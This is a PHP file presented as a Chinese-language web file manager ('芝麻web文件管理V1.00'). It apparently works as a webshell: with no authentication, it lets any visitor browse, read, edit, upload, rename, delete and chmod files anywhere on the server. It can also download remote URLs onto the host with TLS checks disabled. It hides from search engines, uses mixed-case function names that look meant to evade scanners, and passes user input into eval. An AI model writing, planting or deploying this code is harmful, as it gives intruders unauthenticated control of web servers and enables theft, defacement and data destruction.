<?php
eRRor_rEporTing(0);
$wwwroot=isset($_SERVER['DOCUMENT_ROOT'])?trim($_SERVER['DOCUMENT_ROOT']):'';
$req_uri=isset($_SERVER['REQUEST_URI'])?trim($_SERVER['REQUEST_URI']):'';
$req_uri!=''?($req_uri_arr=explode('?',$req_uri)).($script_name=$req_uri_arr[0]):($script_name=isset($_SERVER['SCRIPT_NAME'])?trim($_SERVER["SCRIPT_NAME"]):'');
$script_filename=isset($_SERVER['SCRIPT_FILENAME'])?trim($_SERVER['SCRIPT_FILENAME']):'';
if ($script_filename=='') $script_filename=__FILE__ ;
if ($wwwroot=='' && $script_name!='' && $script_filename!='') $wwwroot=str_replace($script_name,'',$script_filename);
$wwwroot=str_replace('\\','/',$wwwroot);
$dir=isset($_GET['d'])?trim($_GET['d']):'';
$dir=str_replace('\\','/',$dir);
$file=isset($_GET['f'])?trim($_GET['f']):'';
$file=str_replace('\\','/',$file);
$action=isset($_GET['a'])?trim($_GET['a']):'';
if ( $action=='' )
{
    $current_dir=$dir==''?$wwwroot:$dir;
    $current_dir=rtrim($current_dir,'/');
    $current_dir_nav='';
    $dir_path='';
    $current_dir_split=explode('/',$current_dir);
    foreach( $current_dir_split as $dir )
    {
        $dir_path.=$dir.'/';
        $current_dir_nav.='<a href="?d='.$dir_path.'">'.$dir.'/</a>';
    }
    $dir_rows='';
    $file_rows='';
    $current_dir_list=sCaNDir($current_dir);
    $row_id=0;
    foreach( $current_dir_list as $target_name )
    {
        if ( $target_name=='.' || $target_name=='..' ) continue;
        $target=$current_dir.'/'.$target_name;
        $target_ahref=strpos($target,$wwwroot)===0?'<a href="'.str_replace($wwwroot,'',$target).'" target="_blank">'.$target_name.'</a>':$target_name;
        $row_id++;
        $target_u_id=fIlEOwNEr($target);
        $target_u_att=poSIx_GEtpWUid($target_u_id);
        $target_owner=$target_u_att['name'];
        $target_perm=get_qx($target);
        $target_mtime=date('Y-m-d H:i:s',fILeMTiMe($target));
        if ( is_dir($target) )
        {
            $dir_rows.='<tr class="tl"><td><i class="fa fa-folder" style="font-size:20px;color:orange;"></i></td><td><a href="?d='.$target.'">'.$target_name.'</a></td><td></td><td>(<a href="#"  onclick="show_input_box(\'qx'.$row_id.'\',\''.$target.'\',\'d\',\'qx\');">'.$target_perm.'</a>)'.$target_owner.'<span id="qx'.$row_id.'"></span></td><td>'.$target_mtime.'</td><td><a href="#" onclick="show_input_box(\'gm'.$row_id.'\',\''.$target.'\',\'d\',\'gm\');">改名</a>|<a href="#" onclick="confirm_sc(\''.$target.'\',\'d\');">删除</a><span id="gm'.$row_id.'"></span></td></tr>';
        }else
        {
            $target_fsize=fILesIzE($target);
            $target_fsize<1024?$target_fsize.=' B':($target_fsize=round($target_fsize/1024,1)).($target_fsize<1024?$target_fsize.=' KB':$target_fsize=round($target_fsize/1024,2).' MB');
            $file_rows.='<tr class="tl"><td><i class="fa fa-file" style="font-size:20px;color:grey;"></td><td>'.$target_ahref.'</td><td>'.$target_fsize.'</td><td>(<a href="#" onclick="show_input_box(\'qx'.$row_id.'\',\''.$target.'\',\'f\',\'qx\');">'.$target_perm.'</a>)'.$target_owner.'<span id="qx'.$row_id.'"></span></td><td>'.$target_mtime.'</td><td><a href="#" onclick="window.open(\'?f='.$target.'&a=ck\',\'_blank\',\'width=800,height=600,top=200,left=300\');">查看</a>|<a href="?f='.$target.'&a=bj">编辑</a>|<a href="#" onclick="show_input_box(\'gm'.$row_id.'\',\''.$target.'\',\'f\',\'gm\');">改名</a>|<a href="#" onclick="confirm_sc(\''.$target.'\',\'f\');">删除</a><span id="gm'.$row_id.'"></span></td></tr>';
        }
    }
    $div_html='<table cellspacing="10">
                 <tr><td colspan="6"><form name="form_up" id="form_up" method="post" action="?d='.$current_dir.'&a=up" enctype="multipart/form-data"><a href="?d='.$wwwroot.'"><i class="fa fa-home" style="font-size:30px;color:orange;"></i></a>&nbsp;&nbsp;当前目录:'.$current_dir_nav.'&nbsp;&nbsp; <i class="fa fa-upload" style="font-size:20px;color:grey;" onclick="document.getElementById(\'file_up\').click();"><input id="file_up" name="file_up" type="file" style="display:none" onchange="document.getElementById(\'form_up\').submit();"></form></td></tr>
                 <tr><td colspan="6"><form name="form_tj" method="post" action="?d='.$current_dir.'&a=tj">新项目名称:<input name="t_name" type="text" size="25"> <select name="t_type"><option value="tj_f">添加文件</option><option value="tj_d">添加目录</option><option value="tj_xz">下载URL</option></select> <input name="submit" type="submit" value="执行"></form></td></tr>
                 '.($row_id==0?'<tr><td>内容为空或无权限查看</td></tr>':$dir_rows.$file_rows).'
              </table>';  
}elseif ( $action=='sc' )
{
    if ( $file!='' )
    {
        uNlInk($file); jump_to('?d='.diRNaMe($file));
    }elseif( $dir!='' )
    {
        rm_rf($dir); jump_to('?d='.DIrnaMe($dir));
    }
    exit;
}elseif( $action=='gm' )
{
    $gm=isset($_POST['gm'])?trim($_POST['gm']):'';
    if ( $gm!='' )
    {
        $old_f=$file==''?$dir:$file;
        if ( $old_f!='' && file_exists($old_f) )
        {
            $old_dir=DIrnAme($old_f); rEnAme($old_f,$old_dir.'/'.$gm); jump_to('?d='.$old_dir);
        }
    }else
    {
        show_msg('请输入新名称!','back');
    }
    exit;
}elseif( $action=='qx' )
{
    $target=$dir==''?$file:$dir;
    if ( $target!='' )
    {
        $qx=isset($_POST['qx'])?trim($_POST['qx']):'';
        if ( $qx!='' && is_numeric($qx) && substr($qx,0,1)=='0' )
        {
            set_qx($target,$qx); jump_to('?d='.dIRnamE($target));
        }else
        {
            show_msg('请输入新权限!','back');
        }
    }
    exit;
}elseif( $action=='ck' && $file!='' )
{
    if ( fiLEsIze($file)<10000000 )
    {
        HEadEr('Content-Type:text/plain; Charset=utf-8;'); echo FIle_gET_coNTEnts($file);
    }else
    {
        show_msg('文件大小超限!','close');
    }
    exit;
}elseif( $action=='bj' && $file!='' )
{
    if ( isset($_POST['f_content']) )  
    {
        FilE_pUt_COnteNts($file,$_POST['f_content']);
        md5($_POST['f_content'])==md5(fILE_Get_cONTenTs($file)) ? show_msg('保存成功!','') : show_msg('保存失败!!','');
    }
    $f_content=is_file($file)?str_replace('</textarea>','&lt;/textarea>',FIle_gET_contENtS($file)):'';
    $div_html='<form name="form_bj" action="?f='.$file.'&a=bj" method="post">编辑当前文件:'.$file.'<br><textarea name="f_content" rows="40" cols="120">'.$f_content.'</textarea><br><input type="submit" value="保存">&nbsp;&nbsp;<input type="button" value="返回目录" onclick="window.location.href=\'?d='.DIrNamE($file).'\';"></form>'; 
}elseif( $action=='tj' && $dir!='' )
{
    $t_name=isset($_POST['t_name'])?trim($_POST['t_name']):'';
    if ( $t_name=='' )
    {
        show_msg('请输入项目名称!','back');
    }else
    {
        if ( $_POST['t_type']=='tj_f' ) fiLe_PUt_coNTentS($dir.'/'.$t_name,'');
        if ( $_POST['t_type']=='tj_d' ) mKDir($dir.'/'.$t_name,0755,true);
        if ( $_POST['t_type']=='tj_xz' ) 
        {
            preg_match('/^http[s]?:\/\/.+/si',$t_name)==0 ? show_msg('下载地址格式出错!','back') : down_file($dir,$t_name) ;
        }
        jump_to('?d='.$dir);
    }
    exit;
}elseif( $action=='up' && $dir!='' && isset($_FILES['file_up']) )
{
    MoVE_upLOadEd_filE($_FILES['file_up']['tmp_name'],$dir.'/'.BaSenaMe($_FILES['file_up']['name'])) ? show_msg('上传成功!','') : show_msg('上传失败!','') ;
    jump_to('?d='.$dir);
    exit;
}

function get_qx($t)
{
    $q=substr(sprintf('%o',fILepErMs($t)),-4);
    return $q;
}
function set_qx($t,$q)
{
    EvAl('cHMoD("'.$t.'",'.$q.');');
    if ( get_qx($t)!=$q )
    {
        $tmp_f=uniqid().'.txt';
        $tmp_c='<?php ChMOd("'.$t.'",'.$q.');?>';
        fiLE_puT_cONtEnTs($tmp_f,$tmp_c);
        require($tmp_f);
        UnLInK($tmp_f);
    }
}

function rm_rf($d) 
{
    if (is_dir($d)) 
    {
        $f_l=sCaNDir($d);
        foreach ($f_l as $f) 
        {
            if ($f=='.'||$f=='..') continue;
            $p=$d.'/'.$f;
            is_dir($p)?rm_rf($p):uNliNk($p);
        }
        rMdIR($d);
    }
}

function show_msg($msg,$go)
{
    echo '<script>alert("'.$msg.'");</script>'; 
    if ($go=='back') echo '<script>window.history.back();</script>'; 
    if ($go=='close') echo '<script>window.close();</script>'; 
}

function jump_to($url)
{
    echo '<script>window.location.href="'.$url.'";</script>';
}

function down_file($dir,$url)
{
    $s_name=array_pop(explode('/',$url));
    if ( $s_name=='' || is_file($dir.'/'.$s_name) ) $s_name=uniqid().'.zmxz';
    $ch=CUrl_iNit();
    cuRl_seTOpt ($ch, CURLOPT_URL, $url);
    cUrL_sEtopt ($ch, CURLOPT_RETURNTRANSFER, 1);
    cuRL_setOPt ($ch, CURLOPT_CONNECTTIMEOUT, 5);
    cuRL_setOPt ($ch, CURLOPT_SSL_VERIFYPEER, false);
    cuRL_setOPt ($ch, CURLOPT_SSL_VERIFYHOST, false);
    cuRL_setOPt ($ch, CURLOPT_BINARYTRANSFER, true);
    $contents = cUrl_eXeC($ch);
    cURl_CLosE($ch);
    if ( empty($contents) ) $contents=filE_geT_cONTentS($url);
    if ( empty($contents) )
    {
        show_msg('下载出错!','');
    }else
    {
        fIle_PuT_cONteNts($dir.'/'.$s_name,$contents);
        show_msg('下载完成!','');        
    }
}

?>
<html>
    <head>
        <title>芝麻web文件管理</title>
        <meta name="robots" content="none">
        <meta http-equiv="Content-Type" Content="text/html; Charset=utf-8">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    </head>
    <body>
    <style>
    a {color:#000000;text-decoration:none;}
    a:hover {color:#ff0000;}
    .tl:hover {background-color:#eeeeee;}
    form {margin:0;}
    </style>
    <script>
        function show_input_box(s,t,f,a,)
        {
           var span=document.getElementById(s);
           if ( span.innerHTML=='' )
           {
                span.innerHTML='<form name="form_'+s+'" method="post" action="?'+f+'='+t+'&a='+a+'"><input name="'+a+'" type="text" size="8"><input type="submit" value="提交"></form>';                
           }else
           {
                span.innerHTML='';
           }
        }
        function confirm_sc(t,f)
        {
            if (f=='d')
            {
                if ( confirm('确定要删除此目录吗?') )
                {
                    window.location.href='?d='+t+'&a=sc';
                }
            }
            if (f=='f')
            {
                if ( confirm('确定要删除此文件吗?') )
                {
                    window.location.href='?f='+t+'&a=sc';
                }                
            }
        }
    </script>
        <div>
            <h1>芝麻web文件管理V1.00</h1>
            <?php echo $div_html;?>
        </div>
    </body>
</html>
